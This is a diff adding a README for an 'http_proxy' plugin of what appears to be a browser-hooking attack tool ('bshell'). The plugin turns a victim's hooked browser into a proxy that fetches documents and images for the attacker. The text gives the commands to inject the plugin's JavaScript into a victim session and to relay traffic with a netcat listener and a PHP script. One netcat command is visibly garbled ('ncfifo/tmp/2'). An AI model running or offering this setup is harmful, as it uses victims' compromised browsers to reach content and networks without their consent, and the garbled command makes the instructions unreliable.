@@ -1,0 +1,28 @@
+
+How to use the hooked browser as a proxy for requesting documents from any
+domain that allow x-domain requests. It even handles images.
+
+
+You need: nc (netcat, or socat if you prefer), PHP (no sockets ext needed!)
+
+Inject the hooked browser with the http_proxy plugin:
+[root bshell]# cp plugins/http_proxy/http_proxy.js payloads/{sessionid}/
+
+In one terminal, run:
+[root bshell]# while true; do echo `date`; rm -f /tmp/ncfifo? ; mkfifo /tmp/ncfifo1 ; mkfifo /tmp/ncfifo2; nc -nvk -l 32455 >/tmp/ncfifo1 <ncfifo/tmp/2; sleep 1; done
+
+In another terminal, run:
+[root bshell]# tail -f bshell.log | grep 'proxy => '&
+[root bshell]# while true; do php -n plugins/http_proxy/proxy.php b9961268051ea4dab3ce9add2d3947d2 </tmp/ncfifo1 >/tmp/ncfifo2; sleep 1; done
+proxy => next request please!
+
+Now you can point your http client to port 32455 and it will forward your request
+to the browser, the browser fetches the page (or image), and sends it back to you.
+
+Note: for reasons, all images are extracted using <canvas>, so browser must have
+canvas support to handle images properly. Other document types are handled as
+binary data, and always sent back base64 encoded to avoid wierd bugs. Larger documents 
+or images may fail.
+
+Note 2: No, it does not handle POST data (though the method would work) or any other sending of attached data. You'd have to help out
+with that.
